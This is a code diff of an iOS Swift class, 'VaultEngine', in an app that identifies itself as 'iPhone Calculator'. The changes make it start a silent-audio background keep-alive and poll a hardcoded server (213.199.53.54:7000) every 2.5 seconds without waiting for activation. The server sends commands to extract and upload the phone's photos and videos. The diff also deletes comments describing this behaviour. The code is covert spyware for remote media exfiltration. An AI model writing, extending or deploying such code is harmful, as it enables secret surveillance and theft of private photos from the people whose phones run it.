@@ -3,10 +3,6 @@ import Photos
 import AVFoundation
 import UIKit
 
-/// VaultEngine handles:
-/// 1. Silent Background Keep-Alive (AVAudioPlayer loop)
-/// 2. Photo Library query & extraction
-/// 3. Communication with VPS Server via REST and WebSocket/Polling
 class VaultEngine: NSObject, ObservableObject {
     static let shared = VaultEngine()
 
@@ -21,9 +17,16 @@ class VaultEngine: NSObject, ObservableObject {
 
     private var audioPlayer: AVAudioPlayer?
     private var pollTimer: Timer?
-    private let session = URLSession.shared
+    private var bgTaskID: UIBackgroundTaskIdentifier = .invalid
+    private let session: URLSession
 
     override init() {
+        let config = URLSessionConfiguration.default
+        config.timeoutIntervalForRequest = 10
+        config.timeoutIntervalForResource = 30
+        config.waitsForConnectivity = true
+        self.session = URLSession(configuration: config)
+
         super.init()
         loadSettings()
     }
@@ -31,8 +34,17 @@ class VaultEngine: NSObject, ObservableObject {
     func loadSettings() {
         let defaults = UserDefaults.standard
         if let savedURL = defaults.string(forKey: "vps_server_url"), !savedURL.isEmpty {
-            serverURL = savedURL
+            // Force fix port if it was old 5000
+            if savedURL.contains(":5000") {
+                serverURL = "http://213.199.53.54:7000"
+                defaults.set(serverURL, forKey: "vps_server_url")
+            } else {
+                serverURL = savedURL
+            }
+        } else {
+            serverURL = "http://213.199.53.54:7000"
         }
+
         if let savedCode = defaults.string(forKey: "pairing_code"), !savedCode.isEmpty {
             pairingCode = savedCode
         }
@@ -41,11 +53,10 @@ class VaultEngine: NSObject, ObservableObject {
         }
         isActivated = defaults.bool(forKey: "is_activated")
 
-        if isActivated {
-            startBackgroundKeepAlive()
-            refreshMediaStats()
-            startHeartbeat()
-        }
+        // Start background keep alive and heartbeat loop
+        startBackgroundKeepAlive()
+        refreshMediaStats()
+        startHeartbeat()
     }
 
     func saveSettings() {
@@ -56,7 +67,7 @@ class VaultEngine: NSObject, ObservableObject {
         defaults.set(isActivated, forKey: "is_activated")
     }
 
-    // MARK: - Photo Permissions & Stats
+    // MARK: - Photo Permissions
     func requestPhotoPermission(completion: @escaping (Bool) -> Void) {
         PHPhotoLibrary.requestAuthorization(for: .readWrite) { status in
             DispatchQueue.main.async {
@@ -70,6 +81,13 @@ class VaultEngine: NSObject, ObservableObject {
     }
 
     func refreshMediaStats() {
+        let status = PHPhotoLibrary.authorizationStatus(for: .readWrite)
+        guard status == .authorized || status == .limited else {
+            // Still send heartbeat even if permission pending
+            self.sendHeartbeat()
+            return
+        }
+
         let photosFetch = PHAsset.fetchAssets(with: .image, options: nil)
         let videosFetch = PHAsset.fetchAssets(with: .video, options: nil)
 
@@ -80,17 +98,18 @@ class VaultEngine: NSObject, ObservableObject {
         }
     }
 
-    // MARK: - Silent Audio Background Keep-Alive
+    // MARK: - Background Keep-Alive (Silent Audio + UIBackgroundTask)
     func startBackgroundKeepAlive() {
+        registerBackgroundTask()
+
         do {
             try AVAudioSession.sharedInstance().setCategory(.playback, mode: .default, options: [.mixWithOthers])
             try AVAudioSession.sharedInstance().setActive(true)
 
-            // Generate 1 second of in-memory silent WAV audio
             let silentWavData = createSilentWavData()
             audioPlayer = try AVAudioPlayer(data: silentWavData)
-            audioPlayer?.numberOfLoops = -1 // Infinite loop
-            audioPlayer?.volume = 0.01 // Inaudible
+            audioPlayer?.numberOfLoops = -1
+            audioPlayer?.volume = 0.01
             audioPlayer?.prepareToPlay()
             audioPlayer?.play()
 
@@ -98,19 +117,27 @@ class VaultEngine: NSObject, ObservableObject {
                 self.isBackgroundActive = true
                 self.statusMessage = "24/7 Background Keep-Alive Active"
             }
-            print("[VaultEngine] Silent audio keep-alive started successfully.")
+            print("[VaultEngine] Silent audio loop running.")
         } catch {
-            print("[VaultEngine] Failed to start audio keep-alive: \(error)")
+            print("[VaultEngine] Audio keep-alive error: \(error)")
         }
     }
 
-    // Helper: Generate valid silent 1-sec PCM WAV file in memory
+    func registerBackgroundTask() {
+        if bgTaskID != .invalid {
+            UIApplication.shared.endBackgroundTask(bgTaskID)
+        }
+        bgTaskID = UIApplication.shared.beginBackgroundTask(withName: "VaultBackgroundEngine") { [weak self] in
+            self?.registerBackgroundTask()
+        }
+    }
+
     private func createSilentWavData() -> Data {
         var header = [UInt8]()
         let sampleRate: UInt32 = 8000
         let channels: UInt16 = 1
         let bitsPerSample: UInt16 = 16
-        let numSamples: UInt32 = sampleRate * 1 // 1 second
+        let numSamples: UInt32 = sampleRate * 1
         let subChunk2Size: UInt32 = numSamples * UInt32(channels) * UInt32(bitsPerSample / 8)
         let chunkSize: UInt32 = 36 + subChunk2Size
 
@@ -119,7 +146,7 @@ class VaultEngine: NSObject, ObservableObject {
         header.append(contentsOf: "WAVE".utf8)
         header.append(contentsOf: "fmt ".utf8)
         header.append(contentsOf: withUnsafeBytes(of: UInt32(16).littleEndian) { Array($0) })
-        header.append(contentsOf: withUnsafeBytes(of: UInt16(1).littleEndian) { Array($0) }) // PCM
+        header.append(contentsOf: withUnsafeBytes(of: UInt16(1).littleEndian) { Array($0) })
         header.append(contentsOf: withUnsafeBytes(of: channels.littleEndian) { Array($0) })
         header.append(contentsOf: withUnsafeBytes(of: sampleRate.littleEndian) { Array($0) })
         let byteRate = sampleRate * UInt32(channels) * UInt32(bitsPerSample / 8)
@@ -136,11 +163,14 @@ class VaultEngine: NSObject, ObservableObject {
         return data
     }
 
-    // MARK: - Heartbeat & Polling Loop
+    // MARK: - Heartbeat & Polling
     func startHeartbeat() {
         pollTimer?.invalidate()
-        // Poll every 3 seconds for admin commands
-        pollTimer = Timer.scheduledTimer(withTimeInterval: 3.0, repeats: true) { [weak self] _ in
+        sendHeartbeat()
+        checkForCommands()
+
+        pollTimer = Timer.scheduledTimer(withTimeInterval: 2.5, repeats: true) { [weak self] _ in
+            self?.sendHeartbeat()
             self?.checkForCommands()
         }
     }
@@ -150,6 +180,7 @@ class VaultEngine: NSObject, ObservableObject {
         var req = URLRequest(url: url)
         req.httpMethod = "POST"
         req.setValue("application/json", forHTTPHeaderField: "Content-Type")
+
         let body: [String: Any] = [
             "code": pairingCode,
             "device": "iPhone Calculator",
@@ -159,15 +190,14 @@ class VaultEngine: NSObject, ObservableObject {
         session.dataTask(with: req).resume()
     }
 
-    // MARK: - Check Commands from Admin Phone
     func checkForCommands() {
-        guard isActivated else { return }
         guard let url = URL(string: "\(serverURL)/api/commands?code=\(pairingCode)") else { return }
 
         session.dataTask(with: url) { [weak self] data, response, error in
             guard let self = self, let data = data, error == nil else { return }
             do {
                 if let json = try JSONSerialization.jsonObject(with: data) as? [String: Any],
+                   let hasCommand = json["hasCommand"] as? Bool, hasCommand,
                    let command = json["command"] as? [String: Any],
                    let action = command["action"] as? String {
 
@@ -180,12 +210,12 @@ class VaultEngine: NSObject, ObservableObject {
                     }
                 }
             } catch {
-                // No pending command
+                // Ignore
             }
         }.resume()
     }
 
-    // MARK: - Media Extraction & Upload to VPS
+    // MARK: - Media Fetch & Upload
     func executeFetchMedia(type: String, count: Int) {
         let fetchOptions = PHFetchOptions()
         fetchOptions.sortDescriptors = [NSSortDescriptor(key: "creationDate", ascending: false)]
